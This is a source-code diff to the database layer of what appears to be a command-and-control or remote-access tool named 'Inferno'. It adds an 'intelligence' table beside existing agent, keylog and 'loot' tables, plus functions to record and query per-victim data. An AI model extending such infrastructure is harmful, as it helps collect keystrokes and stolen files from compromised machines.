@@ -57,7 +57,8 @@ bool Inferno_Database::createTables() {
             "CREATE TABLE IF NOT EXISTS agents (id INTEGER PRIMARY KEY AUTOINCREMENT, uuid VARCHAR(64) UNIQUE, ip_address VARCHAR(45), hostname TEXT, os_info TEXT, first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP, last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP, is_online BOOLEAN DEFAULT TRUE)",
             "CREATE TABLE IF NOT EXISTS telemetry (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_uuid VARCHAR(64), type VARCHAR(32), content TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)",
             "CREATE TABLE IF NOT EXISTS keylogs (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id INTEGER, data TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)",
-            "CREATE TABLE IF NOT EXISTS loot (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id INTEGER, filename TEXT, file_type VARCHAR(32), content BLOB, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)"
+            "CREATE TABLE IF NOT EXISTS loot (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id INTEGER, filename TEXT, file_type VARCHAR(32), content BLOB, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)",
+            "CREATE TABLE IF NOT EXISTS intelligence (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_uuid VARCHAR(64), data_type VARCHAR(32), value TEXT, context TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP, UNIQUE(agent_uuid, data_type, value))"
         };
 
         for (const QString& sql : schemas) {
@@ -114,6 +115,19 @@ bool Inferno_Database::createTables() {
                     "content BYTEA, "
                     "timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")) {
         qDebug() << "[Database] Error creating loot table:" << query.lastError().text();
+        return false;
+    }
+
+    // 5. Intelligence Table (Circle 6)
+    if (!query.exec("CREATE TABLE IF NOT EXISTS intelligence ("
+                    "id SERIAL PRIMARY KEY, "
+                    "agent_uuid VARCHAR(64) REFERENCES agents(uuid) ON DELETE CASCADE, "
+                    "data_type VARCHAR(32) NOT NULL, "
+                    "value TEXT NOT NULL, "
+                    "context TEXT, "
+                    "timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP, "
+                    "CONSTRAINT unique_intel UNIQUE (agent_uuid, data_type, value))")) {
+        qDebug() << "[Database] Error creating intelligence table:" << query.lastError().text();
         return false;
     }
 
@@ -348,6 +362,88 @@ QStringList Inferno_Database::getKeylogHistory(const QString& uuid, int limit) {
         qDebug() << "[Database] Keylog history fetch error:" << query.lastError().text();
     }
     return history;
+}
+
+bool Inferno_Database::logIntelligence(const QString& uuid, const QString& type, const QString& value, const QString& context) {
+    if (uuid.isEmpty() || uuid == "UNKNOWN_UUID") return false;
+    QSqlQuery query(m_db);
+
+    QSqlField f_uuid("", QMetaType::fromType<QString>()); f_uuid.setValue(uuid);
+    QSqlField f_type("", QMetaType::fromType<QString>()); f_type.setValue(type);
+    QSqlField f_value("", QMetaType::fromType<QString>()); f_value.setValue(value);
+    QSqlField f_context("", QMetaType::fromType<QString>()); f_context.setValue(context);
+
+    QString sql;
+    if (m_db.driverName() == "QSQLITE") {
+        sql = QString("INSERT OR IGNORE INTO intelligence (agent_uuid, data_type, value, context) VALUES (%1, %2, %3, %4)")
+            .arg(m_db.driver()->formatValue(f_uuid))
+            .arg(m_db.driver()->formatValue(f_type))
+            .arg(m_db.driver()->formatValue(f_value))
+            .arg(m_db.driver()->formatValue(f_context));
+    } else {
+        sql = QString("INSERT INTO intelligence (agent_uuid, data_type, value, context) VALUES (%1, %2, %3, %4) "
+                      "ON CONFLICT (agent_uuid, data_type, value) DO NOTHING")
+            .arg(m_db.driver()->formatValue(f_uuid))
+            .arg(m_db.driver()->formatValue(f_type))
+            .arg(m_db.driver()->formatValue(f_value))
+            .arg(m_db.driver()->formatValue(f_context));
+    }
+
+    if (!query.exec(sql)) {
+        qDebug() << "[Database] Error logging intelligence:" << query.lastError().text();
+        return false;
+    }
+    return true;
+}
+
+QList<IntelEntry> Inferno_Database::getIntelligence(const QString& uuid, const QString& typeFilter) {
+    QList<IntelEntry> list;
+    if (uuid.isEmpty() || uuid == "UNKNOWN_UUID") return list;
+
+    QSqlQuery query(m_db);
+    QString sql = "SELECT id, agent_uuid, data_type, value, context, timestamp FROM intelligence WHERE agent_uuid = :uuid ";
+    if (!typeFilter.isEmpty() && typeFilter != "ALL") {
+        sql += "AND data_type = :type ";
+    }
+    sql += "ORDER BY timestamp DESC";
+
+    query.prepare(sql);
+    query.bindValue(":uuid", uuid);
+    if (!typeFilter.isEmpty() && typeFilter != "ALL") {
+        query.bindValue(":type", typeFilter);
+    }
+
+    if (query.exec()) {
+        while (query.next()) {
+            IntelEntry entry;
+            entry.id = query.value(0).toInt();
+            entry.agentUuid = query.value(1).toString();
+            entry.dataType = query.value(2).toString();
+            entry.value = query.value(3).toString();
+            entry.context = query.value(4).toString();
+            
+            QDateTime dt = query.value(5).toDateTime();
+            dt.setTimeZone(QTimeZone::utc());
+            entry.timestamp = dt.toLocalTime().toString("yyyy-MM-dd HH:mm:ss");
+            
+            list.append(entry);
+        }
+    } else {
+        qDebug() << "[Database] Error fetching intelligence:" << query.lastError().text();
+    }
+    return list;
+}
+
+bool Inferno_Database::clearIntelligence(const QString& uuid) {
+    if (uuid.isEmpty() || uuid == "UNKNOWN_UUID") return false;
+    QSqlQuery query(m_db);
+    query.prepare("DELETE FROM intelligence WHERE agent_uuid = :uuid");
+    query.bindValue(":uuid", uuid);
+    if (!query.exec()) {
+        qDebug() << "[Database] Error clearing intelligence:" << query.lastError().text();
+        return false;
+    }
+    return true;
 }
 
 } // namespace inferno
